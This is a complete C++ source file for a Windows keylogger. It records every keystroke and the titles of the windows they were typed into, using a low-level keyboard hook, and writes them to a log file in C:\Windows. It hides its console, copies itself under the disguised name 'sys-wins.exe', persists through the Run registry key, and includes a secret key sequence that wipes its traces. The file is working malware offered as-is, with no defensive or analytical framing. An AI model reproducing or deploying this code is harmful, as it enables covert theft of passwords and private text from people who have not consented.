#include <windows.h>
#include <iostream>
#include <fstream>
#define EXE_NAME "sys-wins.exe"
#define LOG_PATH "C:\\Windows\\test.txt"
//Execute while booting
#define BOOT_HKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
//Where to execute while booting
#define BOOT_PATH "C:\\Windows\\"EXE_NAME
#define PATHSIZE 100
//#define DEBUG

using namespace std;

//Global Variable
HWND lastProc = NULL;  //Global for last window
char *buffer;      //Current window buffer
char magic_key[] = {VK_UP,VK_UP,VK_DOWN,VK_DOWN,VK_LEFT,VK_LEFT,VK_RIGHT,VK_RIGHT,0x41,0x42};
int magic_num = 0;

//Function
//Converts single character to char*(string)
char* chr2str(char ch);
//Handles output for program of strings only
void output(char* out);
//Determines what to send to output for a given virtual key.
void parseChar(int c, bool down=true);
//Deals with processing MSG from keyboard
LRESULT CALLBACK processKB(int code, WPARAM event, LPARAM kb);
//Program suicide
void suicide();
//write to registry
bool WriteToReg(HKEY hkey_root, char *hkey_path, char *value_name, DWORD type, char *reg_data);

char* chr2str(char ch){
    char *ret = (char*)malloc(sizeof(char)*2);
    ret[0] = ch;
    ret[1] = '\0';
    return ret;
}

void output(char* out){
    HWND temp = GetForegroundWindow();
    if(temp != lastProc){
        lastProc = temp;
        char str[256] = "";
        SendMessage(temp, WM_GETTEXT, sizeof(str), (LPARAM)str);
        char* message = (char*)malloc(sizeof(char)*(sizeof(str)+4));
        sprintf(message, "\n[%s]\n", str);
        output(message);
    }
    sprintf(buffer, "%s%s", buffer, out);
    if(out[0]=='\n'){
        #ifdef DEBUG
        cout << buffer;
        #else
        fstream fp;
        fp.open(LOG_PATH, ios::out|ios::app);
        fp << buffer;
        fp.close();
        #endif
        sprintf(buffer, "%c", '\0');   //clean the buffer
    }
    free(out);
}

void parseChar(int c, bool down){
    bool shift = (GetAsyncKeyState(VK_LSHIFT)||GetAsyncKeyState(VK_RSHIFT))?true:false;
    bool ctrl = (GetAsyncKeyState(VK_LCONTROL)||GetAsyncKeyState(VK_RCONTROL))?true:false;
    bool caps = (GetKeyState(VK_CAPITAL)&0x01)?true:false;
    if(!down){
        switch(c){
            case VK_LCONTROL:
            case VK_RCONTROL:
                ctrl = false;
                output(chr2str(']'));
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                shift = false;
                output(chr2str('>'));
                break;
        }
        return;
    }
    //magic key to close the keylogger
    if(c == magic_key[magic_num]){
        if(sizeof(magic_key) == (magic_num+1))suicide();
        magic_num++;
    }else{
        magic_num = 0;
    }

    if(isdigit(c)) output(chr2str(c));
    else if(isalpha(c)) output(chr2str((shift^caps)?c:tolower(c)));
    else{
        switch(c){
            case VK_LCONTROL:
            case VK_RCONTROL:
                if(!ctrl){
                    ctrl = true;
                    output((char*)"CTRL[");
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                if(!shift){
                    shift = true;
                    output(chr2str('<'));
                }
                break;
            case VK_BACK:
                output((char*)"{BACKSPACE}");
                break;
            case VK_DELETE:
                output((char*)"{DELETE}");
                break;
            case VK_TAB:
                output((char*)"{TAB}");
                break;
            case VK_RETURN:
                output((char*)"{ENETER}");
                output(chr2str('\n'));
                break;
        }
    }
}

LRESULT CALLBACK processKB(int code, WPARAM event, LPARAM kb){
    KBDLLHOOKSTRUCT* ptrKB = (KBDLLHOOKSTRUCT*)kb;  //ptr to keyboard hook (struct)
    switch(event){
    case WM_KEYUP:
        parseChar(ptrKB->vkCode, false);
        break;
    case WM_KEYDOWN:
        parseChar(ptrKB->vkCode);
        break;
    }
    return CallNextHookEx(NULL, code, event, kb);
}

void suicide(){
    free(buffer);
    DeleteFile(BOOT_PATH);
    #ifndef DEBUG
    DeleteFile(LOG_PATH);
    #endif
    RegDeleteKey(HKEY_CURRENT_USER, BOOT_HKEY""EXE_NAME);
    exit(0);
}

bool WriteToReg(HKEY hkey_root, char *hkey_path, char *value_name, DWORD type, char *reg_data){
    HKEY hKey;
    bool errorlevel;

    errorlevel = RegOpenKeyEx(hkey_root, hkey_path, 0, KEY_ALL_ACCESS, &hKey); //開啟機碼
    if(errorlevel) return FALSE;
    errorlevel = RegSetValueEx(hKey, value_name, 0, type, (CONST BYTE*)reg_data, strlen(reg_data)); //設定Value
    if(errorlevel) return FALSE;
    errorlevel = RegCloseKey(hKey); //卸除機碼
    if(errorlevel) return FALSE;

    return TRUE;
}

int main(){
    #ifdef DEBUG
    cout << "Now start to log keyboard..." << endl;
    #else
    fstream fp;
    fp.open(LOG_PATH, ios::out);
    fp << "Now start to log keyboard...";
    fp.close();
    FreeConsole();   //No terminal
    #endif

    char file_path[PATHSIZE];
    GetModuleFileName(NULL, file_path, PATHSIZE);
    if(strcmp(file_path, BOOT_PATH) != 0){
        if(!CopyFile(file_path, BOOT_PATH, FALSE)){
            cout << "There is error while copying the file...." << endl;
            return -1;
        }
    }
    if(!WriteToReg(HKEY_CURRENT_USER, (char*)BOOT_HKEY, (char*)EXE_NAME, REG_SZ, (char*)BOOT_PATH))
        cout << "Fail to write booting registry" << endl;

    buffer = (char*)malloc(sizeof(char)*512);
    sprintf(buffer, "%c", '\0');
    HINSTANCE appInstance = GetModuleHandle(NULL);  //App Instance for call back
    SetWindowsHookEx(WH_KEYBOARD_LL, processKB, appInstance, 0);

    MSG msg; //message recieved
    while(GetMessage(&msg, NULL, 0, 0) > 0){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    free(buffer);
    return EXIT_SUCCESS;
}
